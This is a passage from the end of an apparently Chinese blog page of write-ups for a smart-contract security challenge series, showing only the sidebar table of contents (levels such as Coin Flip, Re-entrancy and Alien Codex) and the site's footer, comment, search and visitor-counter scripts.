class="nav-link" href="#Analyse-1"><span class="nav-number">3.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-1"><span class="nav-number">3.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Coin-Flip"><span class="nav-number">4.</span> <span class="nav-text">Coin Flip</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-2"><span class="nav-number">4.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-2"><span class="nav-number">4.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-2"><span class="nav-number">4.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-2"><span class="nav-number">4.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Telephone"><span class="nav-number">5.</span> <span class="nav-text">Telephone</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-3"><span class="nav-number">5.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-3"><span class="nav-number">5.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-3"><span class="nav-number">5.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-3"><span class="nav-number">5.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Token"><span class="nav-number">6.</span> <span class="nav-text">Token</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-4"><span class="nav-number">6.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-4"><span class="nav-number">6.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-4"><span class="nav-number">6.3.</span> <span class="nav-text">Analyse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-4"><span class="nav-number">6.3.1.</span> <span class="nav-text">Solution</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Delegation"><span class="nav-number">7.</span> <span class="nav-text">Delegation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-5"><span class="nav-number">7.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-5"><span class="nav-number">7.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-5"><span class="nav-number">7.3.</span> <span class="nav-text">Analyse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#考点一"><span class="nav-number">7.3.1.</span> <span class="nav-text">考点一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#考点二"><span class="nav-number">7.3.2.</span> <span class="nav-text">考点二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#考点三"><span class="nav-number">7.3.3.</span> <span class="nav-text">考点三</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-5"><span class="nav-number">7.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Force"><span class="nav-number">8.</span> <span class="nav-text">Force</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-6"><span class="nav-number">8.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-6"><span class="nav-number">8.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-6"><span class="nav-number">8.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-6"><span class="nav-number">8.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Vault"><span class="nav-number">9.</span> <span class="nav-text">Vault</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-7"><span class="nav-number">9.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-7"><span class="nav-number">9.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-7"><span class="nav-number">9.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-7"><span class="nav-number">9.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#King"><span class="nav-number">10.</span> <span class="nav-text">King</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-8"><span class="nav-number">10.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-8"><span class="nav-number">10.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-8"><span class="nav-number">10.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-8"><span class="nav-number">10.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re-entrancy"><span class="nav-number">11.</span> <span class="nav-text">Re-entrancy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-9"><span class="nav-number">11.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-9"><span class="nav-number">11.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-9"><span class="nav-number">11.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-9"><span class="nav-number">11.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Elevator"><span class="nav-number">12.</span> <span class="nav-text">Elevator</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-10"><span class="nav-number">12.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-10"><span class="nav-number">12.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-10"><span class="nav-number">12.3.</span> <span class="nav-text">Analyse</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Privacy"><span class="nav-number">13.</span> <span class="nav-text">Privacy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-11"><span class="nav-number">13.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-11"><span class="nav-number">13.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-11"><span class="nav-number">13.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-10"><span class="nav-number">13.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Gatekeeper-One"><span class="nav-number">14.</span> <span class="nav-text">Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-12"><span class="nav-number">14.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-12"><span class="nav-number">14.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-12"><span class="nav-number">14.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-11"><span class="nav-number">14.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Gatekeeper-Two"><span class="nav-number">15.</span> <span class="nav-text">Gatekeeper Two</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-13"><span class="nav-number">15.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-13"><span class="nav-number">15.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-13"><span class="nav-number">15.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-12"><span class="nav-number">15.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Naught-Coin"><span class="nav-number">16.</span> <span class="nav-text">Naught Coin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-14"><span class="nav-number">16.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-14"><span class="nav-number">16.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-14"><span class="nav-number">16.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-13"><span class="nav-number">16.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Preservation"><span class="nav-number">17.</span> <span class="nav-text">Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-15"><span class="nav-number">17.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-15"><span class="nav-number">17.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-15"><span class="nav-number">17.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-14"><span class="nav-number">17.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Locked"><span class="nav-number">18.</span> <span class="nav-text">Locked</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-16"><span class="nav-number">18.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-16"><span class="nav-number">18.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-16"><span class="nav-number">18.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-15"><span class="nav-number">18.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Recovery"><span class="nav-number">19.</span> <span class="nav-text">Recovery</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-17"><span class="nav-number">19.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-17"><span class="nav-number">19.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-17"><span class="nav-number">19.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-16"><span class="nav-number">19.4.</span> <span class="nav-text">Solution</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一"><span class="nav-number">19.4.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一些分析"><span class="nav-number">19.4.2.</span> <span class="nav-text">一些分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二"><span class="nav-number">19.4.3.</span> <span class="nav-text">方法二</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MagicNumber"><span class="nav-number">20.</span> <span class="nav-text">MagicNumber</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-18"><span class="nav-number">20.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-18"><span class="nav-number">20.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-18"><span class="nav-number">20.3.</span> <span class="nav-text">Analyse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#多说的话"><span class="nav-number">20.3.1.</span> <span class="nav-text">多说的话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对于该题"><span class="nav-number">20.3.2.</span> <span class="nav-text">对于该题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-17"><span class="nav-number">20.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Alien-Codex"><span class="nav-number">21.</span> <span class="nav-text">Alien Codex</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-19"><span class="nav-number">21.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-19"><span class="nav-number">21.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-19"><span class="nav-number">21.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-18"><span class="nav-number">21.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Denial"><span class="nav-number">22.</span> <span class="nav-text">Denial</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-20"><span class="nav-number">22.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-20"><span class="nav-number">22.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-20"><span class="nav-number">22.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-19"><span class="nav-number">22.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shop"><span class="nav-number">23.</span> <span class="nav-text">Shop</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-21"><span class="nav-number">23.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-21"><span class="nav-number">23.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse-21"><span class="nav-number">23.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-20"><span class="nav-number">23.4.</span> <span class="nav-text">Solution</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
	<!-- <img style="position: absolute;top: 0;left: 15%;border: 0;width: 200px;height: 200px;" src="http://ojoba1c98.bkt.clouddn.com/img/coding-flag.png" alt="Coding Flag"> -->
      <div class="footer-inner">
        

<div class="busuanzi-count">

  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv"><i class="fa fa-user">本站访客数</i><span class="busuanzi-value" id="busuanzi_value_site_uv"></span>人次</span>
  

  
    <span class="site-pv"><i class="fa fa-eye">本站总访问量</i><span class="busuanzi-value" id="busuanzi_value_site_pv"></span>次</span>
  
  
</div>



        <div class="copyright">
  
  &copy;  2019 - 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-flash"></i>
  </span> | <span class="post-count">共48.0k字</span>
</div>


<!-- <div class="theme-info">
  由  强力驱动
</div> --!>

<div style="width:300px;margin:0 auto;">
  <a target="_blank" href="http://www.beian.miit.gov.cn/" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
    <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#555;">皖ICP备20013338号</p>
  </a>
</div>

<div style="width:300px;margin:0 auto;">
  <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=34122102000129" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
    <img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/beian.png" style="float:left;"/>
    <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#555;">皖公网安备 34122102000129号</p>
  </a>
</div>



        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  


  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="/js/src/Valine.min.js"></script>
  
  <script type="text/javascript">
    new Valine({
        lang: 'zh-cn',
        admin_email: '757610839@qq.com',
        el: '#comments' ,
        appId: '8Irorb3IRbCGqRd9obk9KD98-gzGzoHsz',
        appKey: 'DCF1KCbdAOySKCu1Ooc0J5ku',
        emoticon_url: 'https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/gif/',
        emoticon_list: ["弹肚皮.gif","动次打次.gif","抖脚脚.gif","慌张.gif","夹住.gif","开车.gif","抖眼镜.gif","吃东西.gif","动耳朵.gif","哭唧唧.gif","小花花.gif","眨眼.gif","跳舞.gif","风吹秀发.gif","摇头.gif","眼睛转.gif","跳着走.gif","抖眼.gif","绿色的.gif","我走了.gif","浪起来.gif","打篮球.gif","都是小心心.gif","比心心.gif","吹风.gif","吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
        placeholder: '点击此处填写昵称和邮箱才能留言噢~',
  });
  </script>







  




	





  




  
  
  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length == 0) {
      search_path = "search.xml";
    }
    var path = "/" + search_path;
    // monitor main search box;

    function proceedsearch() {
      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
      $('.popup').toggle();
    }
    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';
      $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = $( "entry", xmlResponse ).map(function() {
            return {
              title: $( "title", this ).text(),
              content: $("content",this).text(),
              url: $( "url" , this).text()
            };
          }).get();
          var $input = document.getElementById(search_id);
          var $resultContent = document.getElementById(content_id);
          $input.addEventListener('input', function(){
            var matchcounts = 0;
            var str='<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length > 1) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var content_index = [];
                var data_title = data.title.trim().toLowerCase();
                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                var data_url = decodeURIComponent(data.url);
                var index_title = -1;
                var index_content = -1;
                var first_occur = -1;
                // only match artiles with not empty titles and contents
                if(data_title != '') {
                  keywords.forEach(function(keyword, i) {
                    index_title = data_title.indexOf(keyword);
                    index_content = data_content.indexOf(keyword);
                    if( index_title >= 0 || index_content >= 0 ){
                      isMatch = true;
                      if (i == 0) {
                        first_occur = index_content;
                      }
                    }

                  });
                }
                // show search results
                if (isMatch) {
                  matchcounts += 1;
                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                  var content = data.content.trim().replace(/<[^>]+>/g,"");
                  if (first_occur >= 0) {
                    // cut out 100 characters
                    var start = first_occur - 20;
                    var end = first_occur + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if(start == 0){
                      end = 50;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    var match_content = content.substring(start, end);
                    // highlight all keywords
                    keywords.forEach(function(keyword){
                      var regS = new RegExp(keyword, "gi");
                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                    });

                    str += "<p class=\"search-result\">" + match_content +"...</p>"
                  }
                  str += "</li>";
                }
              })};
            str += "</ul>";
            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
            $resultContent.innerHTML = str;
          });
          proceedsearch();
        }
      });}

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched == false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(function(e){
      $('.popup').hide();
      $(".popoverlay").remove();
      $('body').css('overflow', '');
    });
    $('.popup').click(function(e){
      e.stopPropagation();
    });
  </script>


  

  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("8Irorb3IRbCGqRd9obk9KD98-gzGzoHsz", "DCF1KCbdAOySKCu1Ooc0J5ku");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  


  <script type="text/javascript" color="255,0,204" opacity='0.5' zIndex="-2" count="80" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>





<!--卖萌-->
<script type="text/javascript" src="/js/src/dytitle.js"></script>
</div></footer></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"superSample":2,"width":200,"height":300,"position":"left"},"mobile":{"show":true},"react":{"opacityDefault":0.9,"opacityOnHover":0.5},"log":false});</script></body>
</html>
